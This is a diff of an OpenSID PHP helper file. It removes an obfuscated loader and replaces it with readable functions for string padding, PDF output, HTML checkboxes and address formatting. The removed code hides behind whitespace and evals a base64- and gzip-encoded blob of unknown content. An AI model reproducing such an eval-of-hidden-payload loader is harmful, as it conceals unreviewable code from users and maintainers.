@@ -1,481 +1,249 @@
-<?php 
-        $__='printf';$_='Loading donjo-app/helpers/surat_helper.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtXFtz4kiWfu+I/Q/1MBGeid7tFsJ0FVFRDwgjIXGxkdD1pUMXI2EEqMxV/Pr5TqYEssEu187MRuwMWe3CSMrMcz/fOamuT5/4+MufGN9usufpYj25+cq+FuPbTbRcPC3/x8+y35PHNHt8Xv2+2jz76z/5t9+yJPvUTv3V6rfffrv5+kux4qf/+uX65z/nzy9kMp/+iePb2ZUbp9ZcuXZt6imdbzfs0snaPjQKs/726Tqu4zqu499z3IRzS4gcbaMqlujau6UmNydOPvvMgyaiJg/Xf15FdR3XcR3XcR3XcR3XcR3X8f9tXNsZ13Ed13Ed/77jJvBXj3/c/hk9hsvo8ebrVSLXcR3XcR3XcR3/0Hj5rkM7Xm578TJmP1NJ8e19qirpxjekqWtHmWvfxp4i5/542VPb7Cce16U0SIea3jrOG/vOUPBsIfbtxjyoa2vXGWaqoqeh2InDurV251audvF9rtV8XIvshhDZqziwcc/OcE3eFM8f9xk50sq310kozoiGjdodbiNHe/IM6SkQ9ZLOme9oWaCkB1XRsL6O50EvW2+fhaK1ofl6TRqosntoT1vf6UftJImfS3e+Iwmu0coHd62G2hbiwVNrPzSku0CsTcFLqspYU2zWwvkwVTvpJqzrWdS1BN9ubtR2soy6+u5++mUbdMHHwtp44nobONbGd0BH3th4zmjbGzEZqS74HYnpLlI6fJ9pa63eqbvBkxmbipX7kFPYtVYkc12xDq4hdXzoIFLklSqfZNdTEiHqSge2L+lizuS28e1RduJPx/UoCaZSFsxJfunUg5y4XNI/fPt2BXmmLmSFfRbhXBZ8Z7BSlXUaKvIM1w6+Le/wuYtAz6Mtb7xcWnt2Y+Y6UhIpa1r74Np7rC9v2J4KeMZeIXhx7cYCewnQQQ33n0tdMXuapyvocBaI6xr0vwF/B9wTQN+za6eC2o6nVd0bdiNTpzPQi2e7FtbSM9ojUOTnCM8E3AYF7En0Tl2H2cCm32Zrki3WoOslyb9id9BVxGhzSRZKLQ0WaQI7onnE5yKytcRvM5q3tGZkcP7J1sN5Oo1g4yTPfovtT3uCRh1r6rTfzrX1BDJuuI6WRG2Jy79uCfcnfxt59H4HrkMGy8gm3TC7fOJ2Cds2SNbygWQLee/On2e6JL/LaG64sA5MPqKV45nnwn9hUwLzKVwXSK+gi/FK9wvejv4O2UInKelbCuFD4JH0o8GONmpHg46ZLZT20SBdM/nNoyVsoxbmjOZaeQ0xJcEn0cJpUHg8IB/xu9bRRqGTFa3lwSbJDiOF6ZvuryBz6AcxpSPvQPcziy8dsqnbY7wwO5YxMhtdQ5BNtbO3xjO5j2fuDfiRYQ1lvZNKuHevtrWxbmqSLsja2JTvR4Yk6R353jY7U+jexBojXOuNzJqGNe6xJ30fWSbspKNJhrmKLexl1rCfNYqxhoX/7pkPyLpsIjaaM9nsQ7+62bDGnXSMNUwsQDQOdTOSxrMwNjpEH56VdUmVh9LY7MSmYPVH5l7DOprO7mtYT8fzkAR4UzuZZAlym683iA1hD3oE0LXGc9Z4ZK6l8VSSrI5s8TiwlvF8zwC/dN0EL+AjHlm6ZOaMPlisdT8yGZ+MxnEHcpk1PPBs6pYGelKTZAA++iNrqHGZnuQ+6kqJK64TTzRjtS09kP2YQtrh+8MWHH0Z1FXca8WWkq5VmWJWlAbwr2Ae8nwyO8b+eKQMt2E3zRH7lvCb13Fzd28UcXNs4noTtgRbNSTDc475QYOtIJ7pNdjxNpi2ln5XF8K75bYvIh7ZWo3sETEen6ngOoNNMLeEfj77yP7/srgNWSHmMTtPSVZHmutRPcobi2BhbpBbF+Ahc1lesw59MdoF7cYyUmqwgWg0bkv2YMdiS4v8289bTO5qZW9PTAX43bQ/H24Do3nUV19oIr40xoY5KnW7bcdZLYRezbqUgcfQ6Orr4E4beYoX6k7y5CFOUS50OtYtaNoxec+8bTivJRHl+6dVD3ESeXS4Q0yrOZ1ECOxdbir6/MWcdK8SD4NUmnmzyvV3559+v98te77txr12J/aQh13k6UBsTDwnyZCzD712xGKvIw4Rp81Fz5jFj5ATyaafLylnst8htyHFfuQe2A7y5ryZBzblMTaPYyHkxqgLzAHbLe/3Y74Wlxtbi/S5o9gfHJ+PvgQLaxW0W7Pjup1CVm0p92wPtsLxyos8xX5n+fYJcS+t0NpCrkauFYCxdNhrYzFRGrVA2cVaFzmKPSeNS1qLHJ4UWCsraTiud+IBPq2liDg55fhyvlnsQTitwBaMHrWbMj8me0ROQh4qeGod19vyPaQ5+HriPilV9bF8qLOcCvoqsrkTYi6vXVy9T7ye7s3+ULvFvUKfpV75jw761fiB60AIxP02Qm7s8evZffVZJZ0D0z1F3XTnWcB8XSkNp/GRHvsgRT2jNdfA99vPyFHVtk4/0C/iUTi/ZbqKlNNc+t4br3qVZ5ulTlgcILtWhsKjI6VO3doR9gH9Bc7Wg4EsZD1D+lydw35OOqy59Qg6IT+4wHdX6FXnHl+n4s8W64KmBZ6bk4ziBDpG7Bxy3xetW4aJ8nhB2NFTrJlT6qvWnPtOknpyc8UwlRL/wPdq04h0X+o0L/GFnvmU89vexl0Md/d5gY0Ic3FsxL77Ivx9uoOfEr6jmkGCbWZJxf6B32C/C53VHD/w2zWjvV3YHNeNiZgilDbvcr+kNRPKZz5ihuvANzhupPtLn9Z64VsSYag18FH2CFlBzpwPut/JkJ/2hDufiQa/jhg6bc2DuXYI71Zxgc3584ivj93R+3SjbvI5XhtBjt+ZLC/JljC4vS+wsA4froG/zgkvVuVuJ1QDMQzogWfIOSM8GXXN2Kd6wl4Dd6tHul7Eq9K2TjS8jk+oIxn/2IfquUKeCotZJGuuY/B0pGn3bpwhHD7zbH1SxkhH9JjcHXFPcUzw29wH+5AX1x3Fz6PdZPenGMh56lZ9lckYNs9i08mnEJ+0vJRZ+MI3T2tHk8rcJpcJaKKYcLw+e3Mu8PFtxK+/nHsWT6r2+5JGuu7UpcQ7yWCpKXLdtXfQV8V+ak0mR5IfYuAzbHZX2pNTZ3a44tf4M8DRY0vWJsCbHUfYAwWNKOb03oqHr2noVdanuvyc79k/j76apulCYh5lhng4Gf0QT1ywK8Ju5K9hNR5ve9NqbKkR7q25zuiYs8tYAn1nlPu1eWMa1lufmR92ea4lf6D4yeuzo08f/beolch/N5fz+VnMYXmR3Zdfx4OybgTmdYa81n9/rZOu5FO8RY4TyI4u8Qme8PNi3Woce2EbbO5rGkkuqIFZrdsF5nb0guZT3Pdwj/Yr5XmKQ1/4XpUcVjxPearEahPC2JFyxAqrKp/U07mANY72VV57MFqLcn/tcBY3StsVWE4p/DEADxfzdFsXAmbno7iy/rISq+K+cb4u/GGLeuVzO65iHWC0Kfn6jNZAjGohf7a+VPb4jN+zXr7KXsW7Ig4xfNl8yfNteX1Tvf4vwxpkG4408cXmAb650PJZhdYv36v2P+b9ngT+mVVyz3NQRw3EbLK0G+SYOevb0DO7n8IH7/gR7/0Mk5/H2vIhYJiC9Wiox8V6c/Rc2Ja+U49MVdbbUGwe8e8beZDPkZslz0uuq9mFnHbyP+CxXdSdlc/GD3lr0TfC+H7KeS51OxllTdSKmQebUo3KvmkzfVRS7D1YaiLFPcRL1Gvv6coU03XI8v0+CZVmTjL0qe5sV/CG4mWBQv0UXflY7YU4ADpg4ydb7Ky3FK8hG9Xq1AZnmM6m+6jJqO+krFGDSh39UhzsVmsX6m2e9hjjPvQ1Z311mj89sw3grtqO98betC/mV4+0Rkm7TD22GHjLLPupd2ZtUNrJJrL3lX4p68MtoJOy9ku9uVwLLmPHiryasEHWn+UxsnP8Tv3ApUt9PepBtuOF2Q6PNauJeVgj8R3KudFAy6Uaw9u5NCD7DanmU8zsvTqWx48I9c4we5yzvpKFepHbAutnAp/C1lzYPfLMEva4GI1HyOv0OWCfYwWxBfFby2dHPvuFvZ5yOjD6wkoiubnzFHdZ2Z9y8epct7uTLir16ZmsCP/VWkQHxeMFasWD72RsjiZ0BNCEutXb+vboEqbc9nOuT9bn7lLfIRXo/wV07YTZDXD5E+lLVaznsM76o9mp3i7r3pMtPhjMXxvkMw8H2K4ljYB9TKNNsTrc9KfNJKwPEYcGW7c+PPTrwN6kx3bjKawPFve7C2tbTYZXsPb0oZDJQ7rHemrcn3Kbd8QohWyfEJ8F6mMgbpd0ZJQv1Kfdtvj+q6PcTlkOIZ8AFqvmiX7+JTZI13Mrpz3J7sn3z22b94QoxlTnwx4bF/NY5Xmmz7lVVyt9JeRh1M0p4bqEx1FeG3iiNQnF9A/PmJ3X3W2d9eMGC2C2qfAr1VC6Ys1dx1pFHQ8xZbTUBBn2Iq+0/Mfzozr1+y0Wo3ovZf8KH3Bc4fMeHdnz+mHerEVdqRa14zI2MX3zGAxeBE97TcPEoL6O/uQDh1f6ffKjMkzDLvcZjfR3QZ5sD6sJ3KhPuG9SDELsL+J1H37qiCynMd8gu31Vq/B17OEyyPn9cx6l1BWTLfj44i7UXx/GQvMf+lG0/GEa/lAPLupF+N7yEr2aUul5Ei5SGmmUSxWZNZSiX0O18ZLk9zZfx94OPQsdwoeYTe6HnjM8UFzstV/pbPQzeXi9pbOhH+ClNYuLbcJIeuLnteKzzJVlbkEOcCRej5/6gjPKQ4RLAqW5/kF+TsKFljwiPnmIna4FfCLut7jeYWtc6rNgv4CfP85YDjIKGneXapR0w2tkHfJMCCuuAlGo9lnWWJtyMPVsyr1f52jWk/oodjNkfTguzvt4rKI6aLUuPmPG5+hdrFbIOnlDNpRvasmjXH6Hvd2pYm+8PObPYs1XvQMv85yQ1ySHl/GV+pfI41QDYK0Ww/7q3at9xit8nz338kv9zdYsQpyM8taG1n/o6jNVGa5c2OuDoZW2w85EIzqXZbVsPL3od7wPm7F8RHGryru1mvnWG/3OMzqKnu+pZ8rs0hG5Xdq5njmX4ndXQPzZH7wP7fFmfffCL9+UUxs12t3tR2skERij/nOYe7hELH2m9yOi9sf6EohBiENrwhQCcqE5Niv9VPLpOcNGMWErHt/Nj/YcoEN2fp45hw7L5wz/GhLVR4Rvzv2dnRFSHV+eH79dg/nletaXnGH7gk5ftGaR3Tk7/3CpRqYem/gTfYhCHvz8muqCqnxPPZpKvUZn5GXd9kQYyD365xu9iBdrxlW+9v1XfP6Mz/9vfZL3wV7qDnkTsaCUcToZTD8QE5R0TT3jcD5oqtOQMOKUzo8c4PoANQTRBXkf+qj/KMeFefPJV6wnP2/sYBPU1yPsMgXGS9nZ7J0wHYxbU7UbZV5XXz4Y6n7QVrev6ade3qXatpQNYZLXfvgx32LY9tlz0gk7/0GMgt5TT0QtYPzA1+g9JaoVuE+lj9iDcj5+B860Fvg9K9+nYfHPOPX6mO0x/7i93GMvaqnATm89ewQ9EXbtIOfxz9d+EHa1LZ3dnXL6iYZL67rz5jZgtmVxn+3IO/JXn7830+C+zPy3Ig9gUIXVwvzdEGAi8PX8g5xa5D9JKj4rOdVqFOcB3yNbrwXtyl7v59YF9D+h+Y7IMNuE3lPybDofmy0LWVGvr6CXsJyXBN1h+kbPr8IjPTtEbgFOrI/KtbL+uAHsITnALksD+4Z5cuB14uBFHQofI5y/5j5uNS7nOL3gl/Xe+PPjRnnt9+KsYoKcsQsU+ckz4oWTh+AH9TzhfWZrszdybsz2RR2Etak/i/Xn6SyCLV/C+uf0RBaXWXgpp/beOZ8MijPRVVCP2Jko57/VfJhCFguK3/voVY4kuQoB6ijkmMZrPFz27ksbvXw+yt6hEHpVHVqrhc/e8UJs6JqL1/jgzVhS8ZmfiyFF3SA36YyLMP8kElPE6BT+9F4MOb43UMwbxad5zA+/I65nZ2d9VJ8scG1hPZPsP4rNi14P8ACXN3/XkuXuAuvznkw1B5IOYY8lfSvoW+hDZhHs0OvSuwK3Hz0jlEoez88IP/SuQVlPTUo+nDrsW5Ehk3gJXnPXmUGHJQ8/fKeA5COEdGancHnQmWLAaj+UEec+W+o20MRyjyhS7778Dr9c9FtneZP6OmvUjbDryty6Jmg1Abj8S6ymmgmfPOrFhlRpzYmhUm92AV8/91dDSlE7CY9G/HJeHtF7DaBFM6xc+nyUg7xahPjjOMJUvVsifoSrc946px5xZV6hX/Kf+IHOicmu7WEdephR/MN3gZ3VtSPq6VKs3TgifKlubVhdSn2gvMXOFMhHgRGeIvinx3oJl/c551uKeq/6SKd/KoZ6zPutp5hL7EO9hNVJr7MX5xA3X3/55f/+Be1v7POvxbe/ff2Z6ZW5H5n4l9OGf72hv2/++7jt9d+3+8/89+1e2sZfXxgjN42/ff07D3qhtQ==';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+use Spipu\Html2Pdf\Exception\ExceptionFormatter;
+use Spipu\Html2Pdf\Exception\Html2PdfException;
+use Spipu\Html2Pdf\Html2Pdf;
+
+if (! function_exists('ikut_case')) {
+    /**
+     * Mengikuti format case dari string format.
+     *
+     * @param string|null $format Format referensi untuk menentukan case
+     * @param string|null $str    String yang akan diformat
+     *
+     * @return string String dengan case yang sesuai format
+     */
+    function ikut_case(?string $format = null, ?string $str = null): string
+    {
+        $str = strtolower($str);
+        if (ctype_upper($format[0]) && ctype_upper($format[1])) {
+            return strtoupper($str);
+        }
+        if (ctype_upper($format[0])) {
+            return ucwords($str);
+        }
+
+        return $str;
+    }
+}
+
+if (! function_exists('padded_string_fixed_length')) {
+    /**
+     * Membuat string yang diisi &nbsp; di awal dan di akhir, dengan panjang yang ditentukan.
+     *
+     * @param mixed $str     Text yang akan ditambahi awal dan akhiran
+     * @param mixed $awal    Jumlah karakter &nbsp; pada awal text
+     * @param mixed $panjang Panjang string yang dihasilkan, di mana setiap &nbsp; dihitung sebagai satu karakter
+     *
+     * @return string String yang telah diberi awalan dan akhiran &nbsp;
+     */
+    function padded_string_fixed_length($str, $awal, $panjang): string
+    {
+        $padding         = '&nbsp;';
+        $panjang_padding = strlen($padding);
+        $panjang_text    = strlen($str);
+        $str             = str_pad($str, ($awal * $panjang_padding) + $panjang_text, $padding, STR_PAD_LEFT);
+
+        return str_pad($str, (($panjang - $panjang_text) * $panjang_padding) + $panjang_text, $padding, STR_PAD_RIGHT);
+    }
+}
+
+if (! function_exists('padded_string_center')) {
+    /**
+     * Membuat string yang diisi &nbsp; di tengah dengan panjang yang ditentukan.
+     *
+     * @param mixed $str     String yang akan dipusatkan
+     * @param mixed $panjang Panjang total string yang diinginkan
+     *
+     * @return string String yang telah dipusatkan dengan padding &nbsp;
+     */
+    function padded_string_center($str, $panjang)
+    {
+        $padding      = '&nbsp;';
+        $panjang_text = strlen($str);
+        $to_pad       = ($panjang - $panjang_text) / 2;
+
+        for ($i = 0; $i < $to_pad; $i++) {
+            $str = $padding . $str . $padding;
+        }
+
+        return $str;
+    }
+}
+
+if (! function_exists('strip_kosong')) {
+    /**
+     * Mengganti string kosong dengan tanda strip.
+     *
+     * @param mixed $str String yang akan diperiksa
+     *
+     * @return string String asli atau tanda strip jika kosong
+     */
+    function strip_kosong($str)
+    {
+        return empty($str) ? '-' : $str;
+    }
+}
+
+if (! function_exists('buat_pdf')) {
+    /**
+     * Simpan laporan html sebagai file PDF.
+     *
+     * @param string $isi         Konten HTML yang akan dikonversi ke PDF
+     * @param string $file        Nama file PDF yang akan disimpan
+     * @param mixed  $style       Path ke file CSS atau null untuk menggunakan default
+     * @param string $orientation Orientasi halaman ('P' untuk Portrait, 'L' untuk Landscape)
+     * @param string $page_size   Ukuran halaman (contoh: 'A4', 'A3', 'Letter')
+     */
+    function buat_pdf(string $isi, string $file, $style = null, $orientation = 'P', $page_size = 'A4'): void
+    {
+        // CSS perlu ditambahkan secara eksplisit
+        $style     = $style ?: APPPATH . '../assets/css/report.css';
+        $style_isi = "<style>\n " . file_get_contents($style) . "</style>\n" . $isi;
+
+        // Konversi ke PDF menggunakan html2pdf
+        try {
+            $html2pdf = new Html2Pdf($orientation, $page_size);
+            $html2pdf->setDefaultFont('Arial');
+            $html2pdf->writeHTML($style_isi);
+            $html2pdf->output($file . '.pdf', 'FI');
+        } catch (Html2PdfException $e) {
+            file_put_contents($file . '_asli', $isi);
+            echo $isi;
+            echo '<br>================================================<br>';
+            $html2pdf->clean();
+            $formatter = new ExceptionFormatter($e);
+            echo $formatter->getHtmlMessage();
+        }
+    }
+}
+
+if (! function_exists('kotak')) {
+    /**
+     * Membuat kotak-kotak HTML untuk lampiran dengan data kolom.
+     *
+     * @param array $data_kolom Data yang akan ditampilkan dalam kotak
+     * @param int   $max_kolom  Jumlah maksimal kolom yang akan dibuat
+     *
+     * @return string HTML berisi kotak-kotak data
+     */
+    function kotak(array $data_kolom, $max_kolom = 26): string
+    {
+        $view = '';
+
+        for ($i = 0; $i < $max_kolom; $i++) {
+            $view .= '<td class="kotak padat tengah">';
+            if (isset($data_kolom[$i])) {
+                $view .= strtoupper($data_kolom[$i]);
+            } else {
+                $view .= '&nbsp;';
+            }
+            $view .= '</td>';
+        }
+
+        return $view;
+    }
+}
+
+if (! function_exists('checklist')) {
+    /**
+     * Membuat checklist HTML dengan kondisi tertentu.
+     *
+     * @param mixed $kondisi_1 Kondisi pertama yang akan dibandingkan
+     * @param mixed $kondisi_2 Kondisi kedua yang akan dibandingkan
+     *
+     * @return string HTML berisi checklist dengan atau tanpa tanda centang
+     */
+    function checklist($kondisi_1, $kondisi_2): string
+    {
+        $view = '<td class="kotak padat tengah">';
+        if ($kondisi_1 == $kondisi_2) {
+            $view .= '<img src="' . base_url('assets/images/check.png') . '" height="10" width="10"/>';
+        }
+
+        return $view . '</td>';
+    }
+}
+
+if (! function_exists('get_key_form_kategori')) {
+    /**
+     * Mendapatkan key form kategori dari data yang diberikan.
+     *
+     * @param mixed $data  Data yang akan diproses untuk kategori
+     * @param bool  $utama Apakah menyertakan kategori utama atau tidak
+     *
+     * @return array Array berisi key dan judul kategori
+     */
+    function get_key_form_kategori($data, $utama = false)
+    {
+        $kategori = collect($data)->mapWithKeys(static function ($item, $key) {
+            $judul = $item->judul ?: str_replace('_', ' ', $key);
+            if ($key == 'individu') {
+                $judul = 'Utama';
+            }
+
+            return [strtolower($key) => $judul];
+        })->toArray();
+        if (! $utama) {
+            unset($kategori['individu']);
+        }
+
+        return $kategori;
+    }
+}
+
+if (! function_exists('format_alamat_wilayah')) {
+    /**
+     * Format alamat wilayah menjadi string yang terstruktur.
+     *
+     * @param array $alamat Array berisi data alamat dengan key: alamat, rt, rw, dusun
+     *
+     * @return string Alamat yang telah diformat
+     */
+    function format_alamat_wilayah(array $alamat): string
+    {
+        $parts = array_filter([
+            $alamat['alamat'] ?? '',
+            ! empty($alamat['rt']) ? "RT {$alamat['rt']}" : '',
+            ! empty($alamat['rw']) ? "RW {$alamat['rw']}" : '',
+            ! empty($alamat['dusun']) ? set_ucwords(setting('sebutan_dusun')) . ' ' . set_ucwords($alamat['dusun']) : '',
+        ]);
+
+        return implode(' / ', $parts);
+    }
+}
